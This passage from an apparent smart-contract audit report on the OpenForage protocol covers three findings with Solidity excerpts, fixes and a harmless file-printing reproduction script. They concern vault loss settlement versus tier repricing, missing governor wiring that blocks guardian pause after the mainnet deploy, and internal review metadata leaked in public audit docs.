```solidity
if (hadLossToResolve && !_lossPendingActive()) {
    _clearLossPendingAndNotifyRegistry();
}
```

##### RISKUSDVault settlement paths

Path: `src/RISKUSDVault.sol`
Highlight lines: 1

```solidity
if (_totalAcknowledgedLoss == 0 && _lossPending) {
    _clearLossPendingAndNotifyRegistry();
}

_settledLossNonce = lossNonce;
_latestLossAmount = 0;
_clearLossPendingAndNotifyRegistry();
```

#### Proof of Concept

`atRISKUSD` redemption value comes from local `_legitimateAssets`, and the upstream vault can clear `lossPending()` through its own settlement paths without any production contract calling tier repricing in the same transaction. The snapshot exposes no onchain coordinator that proves a resolved loss was also applied to tier pricing before exits reopen.

#### Recommendation

Introduce a dedicated onchain settlement coordinator that owns both the upstream loss-settlement privilege and the tier `yieldSource` privilege. That coordinator should:

```solidity
function settleTierLoss(uint256 epoch, uint256[] calldata tierLosses) external onlyKeeper {
    riskusdVault.finalizeLossEpoch(epoch, ...);
    for (uint256 i; i < tierLosses.length; ++i) {
        tiers[i].applyLossEpoch(epoch, tierLosses[i]);
    }
}
```

Then require every exit path to assert `tier.appliedLossEpoch() == riskusdVault.currentLossEpoch()` before pricing or paying withdrawals.

Fix checklist:

- [ ] Add a settlement coordinator that finalizes the vault loss epoch and calls each tier's repricing hook in one transaction.
- [ ] Persist a monotonic loss epoch in the vault and the tiers.
- [ ] Reject withdrawals and previews unless the tier epoch matches the vault epoch.
- [ ] Wire the production deployment to the coordinator instead of separate settlement calls.

#### Assumptions

- [x] Tier holders are expected to bear trading losses pro-rata.
- [x] Settlement and tier repricing are separate operations because no production contract path binds them together.
- [x] The issue matters when upstream loss is not fully and atomically covered before `lossPending()` is cleared.

#### Predicted Invalid Reasons

- The protocol can coordinate this operationally, and the same treasury contract already holds the relevant privileges.

<a id="finding-open-88"></a>
### OPEN-88 — DeployMainnet hands off ownership before wiring governor-based emergency pause into the core vault/token stack

#### Summary

`DeployMainnet` registers `RISKUSD`, `RISKUSDVault`, and `StakingQueue` as guardian-pausable targets, then hands them to the timelock without setting their `forageGovernor` bindings. Because each target only recognizes the guardian module through that stored governor, `guardianPause()` cannot work on the core token/vault/queue stack until delayed governance repairs the wiring.

#### Proof of Concept

`Deploy.s.sol` wires the core contracts into `GuardianModule`, but the targets still start with `_forageGovernor == address(0)`. After `DeployMainnet` hands ownership to the timelock, `GuardianModule.guardianPause()` reaches those targets and the targets reject `pause()` because `_isGuardianModule()` only succeeds when the stored governor can resolve a live guardian module.

##### RISKUSD.initialize()

Path: `openforage_audit_repo/openforage_smart_contracts/src/RISKUSD.sol`

```solidity
function initialize(address initialOwner_) external initializer {
    ...
    __Ownable_init(initialOwner_);
    __Ownable2Step_init();
    __Pausable_init();
}
```

##### RISKUSD.pause()

Path: `openforage_audit_repo/openforage_smart_contracts/src/RISKUSD.sol`

```solidity
function pause() external {
    if (msg.sender != owner() && msg.sender != _forageGovernor && !_isGuardianModule(msg.sender)) {
        revert UnauthorizedPauseControl(msg.sender);
    }
    _pause();
}
```

##### RISKUSD._isGuardianModule()

Path: `openforage_audit_repo/openforage_smart_contracts/src/RISKUSD.sol`

```solidity
function _isGuardianModule(address caller) internal view returns (bool) {
    if (_forageGovernor == address(0) || _forageGovernor.code.length == 0) return false;
    try IForageGovernorPause(_forageGovernor).guardianModule() returns (address gm) {
        return caller == gm && gm != address(0);
    } catch {
        return false;
    }
}
```

##### Deploy.s.sol pausable target wiring

Path: `openforage_audit_repo/openforage_smart_contracts/script/Deploy.s.sol`

```solidity
RISKUSD(deployedRiskusd).setMinter(deployedRiskusdVault);
RISKUSD(deployedRiskusd).setBlocklist(deployedBlocklist);
RISKUSDVault(deployedRiskusdVault).setBlocklist(deployedBlocklist);
...
StakingQueue(deployedStakingQueue).setBlocklist(deployedBlocklist);
...
_registerPausableTarget(deployedRiskusd);
_registerPausableTarget(deployedRiskusdVault);
_registerPausableTarget(deployedStakingQueue);
```

##### DeployMainnet production timings

Path: `openforage_audit_repo/openforage_smart_contracts/script/DeployMainnet.s.sol`

```solidity
uint256 public constant PRODUCTION_MIN_DELAY = 8 days;
uint256 public constant PRODUCTION_VOTING_DELAY = 1 days;
uint256 public constant PRODUCTION_VOTING_PERIOD = 5 days;
```

##### setForageGovernor() / finalizeForageGovernor()

Path: `openforage_audit_repo/openforage_smart_contracts/src/RISKUSD.sol`

```solidity
function setForageGovernor(address forageGovernor_) external onlyOwner {
    _pendingForageGovernor = forageGovernor_;
    _pendingForageGovernorProposedAt = block.timestamp;
}

function finalizeForageGovernor() external onlyOwner {
    if (block.timestamp < _pendingForageGovernorProposedAt + _finalizeDelay()) revert FinalizeDelayNotElapsed();
    _forageGovernor = _pendingForageGovernor;
}
```

#### Recommendation

Complete the governor wiring before production handoff.

Primary fix:
- Before `_handoffToProductionGovernance()`, call `setForageGovernor()` and `finalizeForageGovernor()` for every target that relies on `_forageGovernor` for pause/cap authority.
- If production timings prevent immediate finalization in the mainnet dry-run path, add an explicit pre-handoff timelock sequence or a dedicated genesis initializer/reinitializer that atomically sets the governor bindings.

Alternative fix:
- Make the affected contracts resolve the guardian module directly from an immutable/current governor source that is initialized at deployment, rather than requiring a separate delayed owner flow after launch.

Fix checklist:

- [ ] Wire and finalize `forageGovernor` for `RISKUSD`, `RISKUSDVault`, and `StakingQueue` before `_handoffToProductionGovernance()`.

#### Assumptions

- [x] The production deployment follows `DeployMainnet` / `Deploy.s.sol` as retained in this snapshot.
- [x] No separate private post-deploy governance sequence wires `forageGovernor` into these targets before the system is considered live.
- [x] The intended emergency architecture is the one expressed by the registered pausable targets and the pause guards in the contracts themselves.

#### Predicted Invalid Reasons

- “The timelock still owns these contracts, so governance can pause them or wire the governor later. This is only a deployment-script sequencing detail.”

<a id="finding-open-97"></a>
### OPEN-97 — Supplemental audit docs publish internal Codex thread IDs, task IDs, and prompt/skill metadata

#### Summary

The retained audit markdown previously published internal review thread IDs, internal task IDs, model/runtime notes, and internal prompt-basis paths even though the snapshot policy excludes internal prompt/tasklist artifacts and private workflow content. This is a real documentation-scope leak, but it is low severity because the exposed values are opaque provenance rather than secrets or an exploitable control surface.

#### Context Files

##### audit_scope.md excerpt

Path: `documentation/audit_scope.md`
Highlight lines: 54

```markdown
- Internal project/spec/tasklist/prompt artifacts.
```

##### pashov-supplement.md excerpt

Path: `documentation/smart_contract_audits/2026-06-09-audit/openforage-smart-contract-audit/pashov-supplement.md`
Highlight lines: 5, 7, 8

```markdown
Public review reference: `public-review-2026-06-09-pashov`.
Review profile: pashov-style supplemental adversarial review plus OpenForage
audit discipline.
```

##### nemesis-supplement.md excerpt

Path: `documentation/smart_contract_audits/2026-06-09-audit/openforage-smart-contract-audit/nemesis-supplement.md`
Highlight lines: 5, 7, 8, 9

```markdown
Public review reference: `public-review-2026-06-09-nemesis`.
Review profile: nemesis-style supplemental deep-logic review with
state-inconsistency analysis and OpenForage audit discipline.
```

##### codex-review.md excerpt

Path: `documentation/smart_contract_audits/2026-06-09-audit/openforage-smart-contract-audit/codex-review.md`
Highlight lines: 3, 4, 24, 28, 30, 40, 46, 48

```markdown
Primary adversarial review reference: `public-review-2026-06-09-primary`.
Replacement final-review reference: `public-review-2026-06-09-final`.
...
`AUDIT_RESULT {"review_id":"public-review-2026-06-09-final","verdict":"PASS"...}`
```

#### Proof of Concept

From the repository root, run the script below. It prints the cited public audit markdown and the retention note, then checks whether the exported tree contains `.claude/` or `.codex/` entries. The reproduction shows the public package carrying internal review provenance in retained markdown.

##### reproduction-script

Path: `latestValidation.analysis#Steps-to-Reproduce`

```bash
#!/usr/bin/env bash
set -euo pipefail

cd <public-audit-repo>

printf '== Included audit evidence ==\n'
nl -ba README.md | sed -n '45,60p'

printf '\n== Out-of-scope wording ==\n'
nl -ba documentation/audit_scope.md | sed -n '48,55p'

printf '\n== Published supplemental metadata ==\n'
nl -ba documentation/smart_contract_audits/2026-06-09-audit/openforage-smart-contract-audit/pashov-supplement.md | sed -n '5,23p'
printf '\n'
nl -ba documentation/smart_contract_audits/2026-06-09-audit/openforage-smart-contract-audit/nemesis-supplement.md | sed -n '5,22p'
printf '\n'
nl -ba documentation/smart_contract_audits/2026-06-09-audit/openforage-smart-contract-audit/codex-review.md | sed -n '24,46p'

printf '\n== Retention note ==\n'
nl -ba documentation/smart_contract_audits/2026-06-09-audit/openforage-smart-contract-audit/round-retention.md | sed -n '1,17p'

printf '\n== Exported tree check ==\n'
if git ls-tree -r --name-only HEAD | rg '^(\\.claude|\\.codex)(/|$)'; then
  :
else
  echo 'No exported .claude/ or .codex/ tree entries'
fi
```

#### Recommendation

- Remove thread IDs, task IDs, model/runtime notes, and `.claude` prompt-basis details from public review documents.
- Replace them with minimal public provenance such as review date, reviewer role, verdict, and redacted evidence references.
- Add a content scan that rejects `.claude/`, `Thread:`, and serialized internal task identifiers in exported markdown.

Fix checklist:

- [ ] Redact exact thread IDs, internal `task_id` values, model/runtime notes, and `.claude/skills/...` references from the public audit markdown.
- [ ] Replace those details with minimal public provenance such as review date, reviewer role, verdict, and sanitized evidence references.
- [ ] Add an export-content scan that rejects `.claude/`, `Thread:`, `task_id`, and similar provenance markers before publication.

#### Assumptions

- [x] This finding is about publication of excluded workflow metadata, not access via the thread IDs themselves.
- [x] The impact is confidentiality and scope-integrity loss for internal review artifacts rather than a direct smart-contract exploit.
- [x] The `.claude` references are concrete path disclosures, not hypothetical extrapolations.

#### Predicted Invalid Reasons

- “These are just opaque provenance strings and internal reviewer notes; they do not expose any secret or exploitable control surface.”
- “Those IDs are opaque and the docs only summarize review provenance.”
